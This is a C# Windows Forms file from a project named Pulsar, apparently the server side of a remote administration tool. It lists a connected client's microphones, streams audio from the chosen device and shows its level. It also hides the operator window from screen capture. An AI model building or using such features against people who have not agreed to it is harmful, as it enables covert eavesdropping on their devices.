using Pulsar.Common.Messages;
using Pulsar.Common.Helpers;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Windows.Forms;
using Pulsar.Server.Properties;
using Pulsar.Server.Forms.DarkMode;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteMic : Form
    {
        /// <summary>
        /// The client which can be used for the remote audio.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly AudioHandler _remoteAudioHandler;

        /// <summary>
        /// Holds the opened remote audio form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteMic> OpenedForms = new Dictionary<Client, FrmRemoteMic>();

        /// <summary>
        /// Creates a new remote audio form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the remote audio form.</param>
        /// <returns>
        /// Returns a new remote audio form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmRemoteMic CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteMic r = new FrmRemoteMic(client);
            r.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, r);
            return r;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmRemoteMic"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote audio form.</param>
        public FrmRemoteMic(Client client)
        {
            _connectClient = client;
            _remoteAudioHandler = new AudioHandler(client);

            RegisterMessageHandler();
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Registers the remote audio message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _remoteAudioHandler.MicrophoneChanged += MicrophoneChanged;
            _remoteAudioHandler.AudioDataReceived += AudioDataReceived;
            MessageHandler.Register(_remoteAudioHandler);
        }

        /// <summary>
        /// Unregisters the remote audio message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_remoteAudioHandler);
            _remoteAudioHandler.AudioDataReceived -= AudioDataReceived;
            _remoteAudioHandler.MicrophoneChanged -= MicrophoneChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called when audio data is received from the remote microphone.
        /// </summary>
        private void AudioDataReceived(object sender, byte[] audioData)
        {
            if (audioData == null || audioData.Length == 0)
                return;

            float level = CalculateAudioLevel(audioData);

            if (audioVisualizer.InvokeRequired)
            {
                audioVisualizer.BeginInvoke(new Action(() => audioVisualizer.UpdateLevel(level)));
            }
            else
            {
                audioVisualizer.UpdateLevel(level);
            }
        }

        /// <summary>
        /// Calculates the audio level from raw audio data.
        /// </summary>
        private float CalculateAudioLevel(byte[] audioData)
        {
            if (audioData.Length < 2)
                return 0f;

            long sum = 0;
            int sampleCount = audioData.Length / 2;

            for (int i = 0; i < audioData.Length - 1; i += 2)
            {
                short sample = (short)((audioData[i + 1] << 8) | audioData[i]);
                int absSample = sample == short.MinValue ? short.MaxValue : Math.Abs(sample);
                sum += absSample;
            }

            float average = (float)sum / sampleCount;
            float normalized = average / 32768f;

            return Math.Min(normalized * 8f, 1f);
        }

        /// <summary>
        /// Starts the remote audio stream and begin to receive audio frames.
        /// </summary>
        private void StartStream()
        {
            try
            {
                ToggleConfigurationControls(true);
                _remoteAudioHandler.BeginReceiveAudio(cbDevices.SelectedIndex);
            }
            catch (Exception ex)
            {
                ToggleConfigurationControls(false);
                MessageBox.Show($"Failed to start microphone stream: {ex.Message}",
                    "Microphone Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Stops the remote audio stream.
        /// </summary>
        private void StopStream()
        {
            try
            {
                ToggleConfigurationControls(false);
                _remoteAudioHandler.EndReceiveAudio(cbDevices.SelectedIndex);
                audioVisualizer.Reset();
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error stopping microphone stream: {ex.Message}");
                ToggleConfigurationControls(false);
            }
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            barQuality.Enabled = !started;
            cbDevices.Enabled = !started;
        }

        /// <summary>
        /// Called whenever the remote microphones changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="devices">The currently available microphone devices.</param>
        private void MicrophoneChanged(object sender, List<Tuple<int, string>> devices)
        {
            cbDevices.Items.Clear();
            foreach (Tuple<int, string> device in devices)
            {
                cbDevices.Items.Add(device.Item2);
            }
            cbDevices.SelectedIndex = 0;
        }

        private void FrmRemoteAudio_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Audio", _connectClient);

            _remoteAudioHandler.RefreshMicrophones();
        }

        private void FrmAudio_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                // all cleanup logic goes here
                if (_remoteAudioHandler.IsStarted)
                {
                    try
                    {
                        StopStream();
                    }
                    catch (Exception ex)
                    {
                        System.Diagnostics.Debug.WriteLine($"Error stopping microphone stream during form close: {ex.Message}");
                    }
                }

                try
                {
                    UnregisterMessageHandler();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Error unregistering microphone message handler: {ex.Message}");
                }

                try
                {
                    _remoteAudioHandler.Dispose();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Error disposing microphone handler: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error in microphone form closing handler: {ex.Message}");
            }
        }

        private void FrmAudio_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;
        }

        #region Audio Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            if (value == 1)
            {
                lblQualityShow.Text = "1000";
                _remoteAudioHandler._bitrate = 1000;
            }
            else if (value == 2)
            {
                lblQualityShow.Text = "2000";
                _remoteAudioHandler._bitrate = 2000;
            }
            else if (value == 3)
            {
                lblQualityShow.Text = "4000";
                _remoteAudioHandler._bitrate = 4000;
            }
            else if (value == 4)
            {
                lblQualityShow.Text = "8000";
                _remoteAudioHandler._bitrate = 8000;
            }
            else if (value == 5)
            {
                lblQualityShow.Text = "11025";
                _remoteAudioHandler._bitrate = 11025;
            }
            else if (value == 6)
            {
                lblQualityShow.Text = "22050";
                _remoteAudioHandler._bitrate = 22050;
            }
            else if (value == 7)
            {
                lblQualityShow.Text = "32000";
                _remoteAudioHandler._bitrate = 32000;
            }
            else if (value == 8)
            {
                lblQualityShow.Text = "44100";
                _remoteAudioHandler._bitrate = 44100;
            }
            else if (value == 9)
            {
                lblQualityShow.Text = "48000";
                _remoteAudioHandler._bitrate = 48000;
            }
            else if (value == 10)
            {
                lblQualityShow.Text = "64000";
                _remoteAudioHandler._bitrate = 64000;
            }
            else if (value == 11)
            {
                lblQualityShow.Text = "88200";
                _remoteAudioHandler._bitrate = 88200;
            }
            else if (value == 12)
            {
                lblQualityShow.Text = "96000";
                _remoteAudioHandler._bitrate = 96000;
            }

            if (value < 8)
                lblQualityShow.Text += " (low)";
            else if (value == 8)
                lblQualityShow.Text += " (best)";
            else if (value >= 9)
                lblQualityShow.Text += " (high)";
        }

        #endregion Audio Configuration

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (cbDevices.Items.Count == 0)
                {
                    MessageBox.Show("No microphone detected.\nPlease wait till the client sends a list with micrphones.",
                        "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                StartStream();
                button1.Enabled = false;
                button2.Enabled = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting microphone: {ex.Message}",
                    "Microphone Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                button1.Enabled = true;
                button2.Enabled = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                StopStream();
                button1.Enabled = true;
                button2.Enabled = false;
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error in microphone stop button: {ex.Message}");
                button1.Enabled = true;
                button2.Enabled = false;
            }
        }
    }
}